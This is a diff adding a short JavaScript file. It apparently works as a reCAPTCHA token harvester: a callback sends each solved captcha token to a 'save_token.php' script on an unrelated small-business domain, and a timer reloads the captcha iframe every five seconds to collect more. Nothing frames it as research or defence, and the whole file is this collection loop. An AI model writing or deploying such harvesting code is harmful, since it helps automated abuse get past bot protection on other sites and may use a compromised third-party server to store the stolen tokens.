@@ -1,0 +1,27 @@
+window.setRecaptchaTokenPay = function(token) {
+    sendToServer(token);
+    setTimeout(function(){
+    $('iframe').eq(0).attr('src', $('iframe').eq(0).attr('src'));
+    }, 5000)
+};
+
+function sendToServer(token) {
+    fetch('https://cotswoldstocoastcampers.co.uk/web-consist/save_token.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ token: token }),
+    })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                console.log("Token saved successfully:", data.message);
+            } else {
+                console.error("Failed to save token:", data.message);
+            }
+        })
+        .catch(error => {
+            console.error("Error sending token to server:", error);
+        });
+}
